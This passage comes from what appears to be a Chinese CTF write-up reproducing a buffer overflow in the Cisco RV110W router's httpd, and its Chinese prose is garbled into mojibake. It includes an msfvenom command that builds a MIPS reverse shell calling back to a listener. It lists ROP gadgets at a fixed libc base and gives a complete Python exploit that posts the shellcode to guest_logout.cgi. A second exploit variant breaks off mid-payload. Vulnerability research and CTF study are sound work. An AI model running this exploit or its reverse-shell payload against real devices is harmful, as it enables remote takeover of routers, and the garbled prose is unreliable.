ï¼Œæˆ‘æ­»æ´»ç”¨ä¸äº†ï¼Œæˆ‘å°è¯•ç”šè‡³åœ¨æˆ‘æœ‹å‹ä¸Šçš„ç”µè„‘ä¸Šå°è¯•éƒ½ä¸è¡Œï¼Œå¯èƒ½å¤§å¸ˆå‚…ä»¬çš„ç”µè„‘æ˜¯<code>MacOS</code>å§ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—®ï¼Œæˆ‘æœ€ååœ¨æ¢åˆ°<code>gdbserver-7.12-mipsel-i-v1-sysv</code>ä¹‹åï¼Œç»ˆäºå¯ä»¥ä½¿ç”¨äº†ï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/16.jpg" class=""><p>ç»ˆäºâ€¦ä¸‹ä¸€ä¸ªé”™è¯¯æ¥äº†ï¼Œ<code>gdb-mutilarch</code>è¿›è¡Œè¿œç¨‹è°ƒè¯•çš„æ—¶å€™ï¼Œ<code>remote</code>ä¸Šå»çš„æ—¶å€™æ–­ä¸ä¸‹æ¥ï¼ŒæŠ¥ä¸‹é¢è¿™ä¸ªé”™ï¼Œçœ‹åˆ°ä¸‹é¢<code>capstone</code>å¥½åƒå‡ºç°äº†é—®é¢˜ï¼Œæ€€ç–‘æ˜¯ç‰ˆæœ¬è¿‡ä½ï¼Œé‡æ–°å®‰è£…<code>pwntools</code>è§£å†³é—®é¢˜</p><p><a href="https://blog.csdn.net/weixin_33674976/article/details/85219451">5å¹´äº†â€¦Capstone ç»ˆäºå‡çº§åˆ°4.0ï¼</a></p><p><a href="https://blog.csdn.net/zhr12321/article/details/116742894">è§£å†³æ–¹æ³•</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/13.png" class=""><p>æ­¤å¤„ï¼Œç»ˆäºçœ‹åˆ°è°ƒè¯•ç•Œé¢äº†ï¼Œæ³ªç›®ï¼ï¼ï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/14.png" class=""><p>æ¥æ¥æ¥ï¼Œé—®é¢˜æ€ªåˆæ¥äº†â€¦ï¼ŒæŒ‰ç…§å¤§å¸ˆå‚…ä»¬çš„åšæ³•ï¼ŒæŒ‰ä¸‹<code>c</code>ä¹‹åï¼Œè¾“å…¥<code>cyclic 200</code>ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œå°±ä¼šå´©æ‰ï¼Œå¹¶çœ‹åˆ°<code>PC</code>å¯„å­˜å™¨è¢«è¦†ç›–â€¦ä½†æˆ‘â€¦æ²¡ååº”å•Šï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/17.jpg" class=""><p>è§£å†³åŠæ³•å°±æ˜¯å…ˆåœ¨<code>sscanf</code>ä¹‹å‰ä¸‹æ–­ç‚¹ï¼ˆåé¢æµ‹è¯•å…¶å®ä¸ç”¨ä¸‹æ–­ç‚¹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œç„¶åå†<code>c</code>ï¼Œæ¥ç€ç”¨<code>exp</code>æ‰“ä¸€ä¸‹ï¼Œå°±æ–­ä¸‹æ¥äº†ï¼ŒåŸå› æ˜¯å› ä¸ºæˆ‘ä»¬æœ¬èº«å°±æ˜¯<code>attach</code>ä¸Š<code>httpd</code>è¿™ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥è¿™ä¸ªè¿›ç¨‹æœ¬èº«è¿˜åœ¨è¿è¡Œï¼Œå¦‚æœæˆ‘ä»¬æ‰“äº†æ–­ç‚¹å¹¶ç”¨<code>exp</code>æ‰“è¿‡å»çš„è¯ï¼Œå®ƒå°±ä¼šæŒ‰ç…§ä»¥å¾€æ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘å»æ‰§è¡Œï¼Œä½†æ˜¯å†æ‰§è¡Œçš„è¿‡ç¨‹ä¸­è¢«ä¸­æ–­äº†ï¼Œæ‰€ä»¥â€¦å°±æ–­äº†ä¸‹æ¥ï¼Œå†å¾€ä¸‹èµ°çš„ï¼Œæˆ‘ä»¬å°±èƒ½çœ‹åˆ°<code>PC</code>å¯„å­˜å™¨è¢«è¦†ç›–äº†ï¼æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„æ“ä½œç”¨<code>cyclic -l</code>æ¥è®¡ç®—åç§»</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/19.png" class=""><p>ç¡®å®šå¥½æº¢å‡ºçš„é•¿åº¦å°±å¯ä»¥å¼€å§‹åˆ©ç”¨äº†ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯<code>ROP+shellcode</code>çš„å½¢å¼ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯ç”Ÿæˆ<code>shellcode</code>å’Œæ³„éœ²<code>libc</code>è·å–<code>gadget</code>çš„é—®é¢˜äº†</p><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>shellcodeä¸€èˆ¬æ¥è¯´å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å››ç§æ–¹å¼è·å–ï¼š</p><ol><li>msfvenom</li><li>shell-storm</li><li>pwntools</li><li>è‡ªå·±ç¼–å†™ï¼ˆç®€å•çš„<code>shellcode</code>è¿˜æ˜¯å¯ä»¥å†™å†™çš„</li></ol><p>å…¶ä»–éƒ½æœ‰è¯•è¿‡ï¼Œ<code>msf</code>è¿˜æ²¡è¯•è¿‡è¿™é‡Œè®°å½•ä¸€ä¸‹â€¦<code>msf</code>æ”¯æŒå¥½å¤šç‰ˆæœ¬çš„<code>shellcode</code>ï¼Œå¤ªé¦™äº†å§ï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/18.png" class=""><p>ç”¨ä¸‹é¢çš„å‘½ä»¤å°±èƒ½ç”Ÿæˆï¼Œæ³¨æ„IPå’Œç«¯å£åŒ¹é…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ  msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure><blockquote><p>æ€»çš„æ¥è¯´è¿˜æ˜¯ï¼š<code>msf</code>æ›´æ–¹ä¾¿å¥½ç”¨ï¼Œå¹¶ä¸”éå¸¸ç¨³ã€‚<code>shell-storm</code>æ‰¾åˆ°çš„ç§ç±»å¤šï¼Œä¸è¿‡å¶å°”éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ã€‚æœ€åå¯¹äºçœŸå®è®¾å¤‡çš„åˆ©ç”¨ä¸Š<code>pwntools</code>ä¼šæœ‰å¾ˆå¤šçš„é—®é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œä¸æ¨èä½¿ç”¨<code>pwntools</code>ç”Ÿæˆ<code>shellcode</code></p></blockquote><p><code>shell-storm</code>é‡Œé¢çš„<code>shellcode</code>ä¹Ÿæ˜¯èƒ½ç”¨çš„ï¼Œä¸è¿‡éœ€è¦ä¿®æ”¹IPåœ°å€</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-860.php">200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb</a></p><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>æ—¢ç„¶è¦<code>ROP</code>ï¼Œé‚£å¿…ç„¶è¦æ³„éœ²<code>libc</code>ï¼Œä½†æ˜¯åœ¨å¤§éƒ¨åˆ†IOTè®¾å¤‡ä¸­ï¼Œåœ°å€éšæœºåŒ–æ˜¯ä¸ä¼šå˜åŒ–çš„ï¼ŒåŒ…æ‹¬è¿™ä¸ªè®¾å¤‡ï¼Œæ‰€ä»¥åœ¨<code>maps</code>ä¸­åŠ è½½çš„<code>libc</code>åœ°å€å°±æ˜¯å®ƒä¸€ç›´ä½¿ç”¨çš„<code>libc</code>åœ°å€ï¼Œæ— è®ºæ˜¯é‡å¯è¿˜æ˜¯æ¢å›ºä»¶ç‰ˆæœ¬ç”šè‡³åœ¨<code>RV130</code>ä¸­ï¼Œ<code>libc</code>çš„åŸºåœ°å€éƒ½ä¸€æ ·ï¼Œè¿™å°±çœå»äº†å¾ˆå¤šæ­¥éª¤ï¼Œä¸‹é¢å¼•ç”¨<code>xuanxuan</code>è€å¸ˆçš„ä¸€æ®µè¯ï¼š</p><blockquote><p>é—®äº†å¸¸è€å¸ˆï¼Œå†æ¬¡çŒœæµ‹å¯èƒ½æ˜¯ä¸ºäº†æ•ˆç‡ï¼Œç¼–è¯‘çš„æ—¶å€™å°±æŠŠå†…æ ¸çš„è¿™ä¸ªåŠŸèƒ½å¹²æ‰äº†ï¼Œæˆ–è€…å½“å‰å¹³å°å‹æ ¹å°±ä¸æ”¯æŒè¿™ä¸ªåŠŸèƒ½ã€‚å…ˆå­˜ç–‘ï¼Œæ€»ä¹‹æˆ‘ä»¬å‘ç°åŠ¨æ€åº“çš„åŸºå€éƒ½æ˜¯ä¸å˜çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¨‹åºåŠ è½½çš„åŠ¨æ€åº“ä¸­çš„<code>gadget</code>ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">âœ  cat /proc/356/maps</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/20.png" class=""><p>å¯ä»¥çœ‹åˆ°å¾ˆå¤š<code>libc</code>ï¼Œè€Œ<code>libc.so.0</code>çš„åŸºåœ°å€æ˜¯<strong>2af98000</strong></p><p>å¾—åˆ°äº†<code>libc</code>åŸºåœ°å€ï¼Œåªè®©æ˜¯å¯»æ‰¾ä¸€äº›å¯ç”¨çš„<code>gadget</code>ï¼Œæˆ‘ä»¬ä½¿ç”¨IDAçš„æ’ä»¶â€”-<code>mipsrop</code>ï¼Œç”±äºå®‰è£…çš„æ—¶å€™å‘ç°ï¼Œå®ƒå¯¹IDA 7.5ä¸æ˜¯å¾ˆæ”¯æŒï¼Œæ‰€ä»¥è¿˜æ˜¯å‡ºäº†ä¸€äº›å°é—®é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹â€¦</p><p><a href="https://www.jianshu.com/p/0f5923fac8d4">è§£å†³IDA æ— æ³•å®‰è£…mipsropæ’ä»¶</a></p><p><a href="https://bbs.pediy.com/thread-266102.htm">IDA æ— æ³•å®‰è£…mipsropæ’ä»¶</a></p><p>å®‰è£…æˆåŠŸåå‘¢ï¼Œåœ¨<code>search</code>ä¸­å°±èƒ½çœ‹åˆ°<code>mips rop gadgets</code>ï¼Œç‚¹å‡»ä¹‹ååŠ è½½äº†<code>mipsrop</code>æ’ä»¶äº†</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/21.jpg" class=""><p>å¯ä»¥ç”¨<code>mipsrop.help()</code>æŸ¥çœ‹<code>mipsrop</code>çš„ä¸€äº›å¸¸ç”¨å‘½ä»¤</p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">mipsropå¸¸ç”¨å‘½ä»¤</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/22.png" class=""><p>åœ¨ä¸Šé¢çš„ç¨‹åºåŠ è½½äº†å¾ˆå¤šåŠ¨æ€é“¾æ¥åº“ï¼Œä½†æ˜¯å´å”¯ç‹¬é€‰æ‹©äº†**/lib/libc.so.0**è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“æ¥å¯»æ‰¾<code>gadget</code>ï¼Œä¸ºå•¥å‘¢ï¼Ÿä¼°è®¡æ˜¯æ¯”è¾ƒç†Ÿæ‚‰å§ï¼</p><p>ç”¨<code>mipsrop.stackfinders()</code>æ¥å¯»æ‰¾ä¸€äº›<code>gadget</code>ï¼Œè¿™äº›<code>gadget</code>éƒ½æ˜¯å’Œæ ˆï¼ˆ<code>$sp</code>ï¼‰ç›¸å…³çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinders()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x158+var_A0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x68+var_40                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x278+var_250                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x20+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xB8+var_98                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0xF0+var_D0                           |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0x98+var_80                           |  jr    0x98+var_s4($sp)                |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x28+var_8                            |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x28+var_10                           |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x70+var_58                           |  jr    0x70+var_sC($sp)                |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_s0($sp)                |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s10($sp)               |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s0($sp)                |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3020+var_1008                       |  jr    0x3020+var_s24($sp)             |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;mov $t9,$a0&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0003D050  |  move $t9,$a0                                        |  jalr  $a0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ä¸¤æ¡å¯ç”¨çš„<code>gadget</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20  |  jalr  $s0  |</span><br><span class="line"></span><br><span class="line">|  0x0003D050  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>ç®—ä¸€ä¸‹æº¢å‡ºåˆ°<code>$s0</code>çš„åç§»<code>0x55-0xe4+0xc0 = 0x31</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/28.jpg" class=""><p>å†çœ‹çœ‹<code>shellcode</code>çš„åç§»ï¼Œæš‚æ—¶è¿˜ä¸ä¼šåœ¨<code>ghidra</code>ä¸Šç”¨<code>mipsrop</code>çš„æ’ä»¶ï¼Œå°±ç”¨äº†ä¸ªç¬¨åŠæ³•ï¼Œåœ¨IDAä¸Šå…ˆæ‰¾<code>gadget</code>ç„¶åï¼Œå†æ¥<code>ghidra</code>çœ‹åç§»ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬<code>shellcode</code>çš„åç§»ä¸º0x18ï¼Œè‡³æ­¤ï¼Œæ‰€æœ‰çš„å‡†å¤‡å·¥ä½œå·²ç»å®Œæˆï¼ï¼ï¼</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/29.jpg" class=""><p>å†å¯åŠ¨ä¸€ä¸ªç»ˆç«¯ï¼Œç›‘å¬<code>shellcode</code>ä¸­å›è¿çš„ç«¯å£ï¼Œç­‰å¾…åå¼¹<code>shell</code>ï¼Œå®Œæ•´<code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x31</span> + p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ç›‘å¬çš„ç»ˆç«¯å·²ç»çœ‹åˆ°åå¼¹<code>shell</code>äº†ï¼Œæ³ªç›®~</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/24.png" class=""><p><code>exp</code>çš„å¦ä¸€ç§å†™æ³•ï¼ŒåŠ å…¥<code>pwntools</code>çš„<code>wait_for_connection</code>æ¨¡å—æ¥å®ç°çš„ï¼Œè¿™æ ·å°±ä¸ç”¨å¼€å¤šä¸€ä¸ªç»ˆç«¯ç›‘å¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move $t9,$a0 ; jalr $a0 </span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr $s0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#LHOST=192.168.1.101 LPORT=8888 </span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf 